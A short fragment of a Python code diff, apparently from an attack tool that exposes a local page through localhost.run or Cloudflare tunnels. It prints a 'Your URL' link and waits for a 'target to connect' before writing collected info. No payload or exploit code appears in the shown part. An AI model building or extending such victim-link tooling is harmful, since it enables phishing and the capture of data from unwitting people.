+            rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+            
+        print("                          " , end="\r")
 #Generate Link====================================================================================================
 
-    line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
-    sleep(0.1)
-    linecache.clearcache()
-    
-    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
-    
+        line = linecache.getline(r"localhost.txt" , 24)
+        print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+        sleep(0.1)
+        linecache.clearcache()
+        
+        Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
+        
+#Run Cloudflare====================================================================================================  
+    if link == 2:
+        
+        cloudfalre()
+        
+        try:
+            print(" ")
+            rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+            
+        print("                          " , end="\r")
+        
+#Generate Link====================================================================================================
+        line = linecache.getline(r"localhost.txt" , 5)
+        
+        line = line.split()
+        
+        print(f"{Fore.CYAN}Your URL : {Fore.LIGHTWHITE_EX}{line[3]}" + Fore.RESET)
+        
+        sleep(0.1)
+        linecache.clearcache()
+        
+        Sprint(Fore.YELLOW + "\n\rwaiting for target to connect...\n".title() + Fore.RESET)
+        
 #Write info====================================================================================================
     try:
         while True:
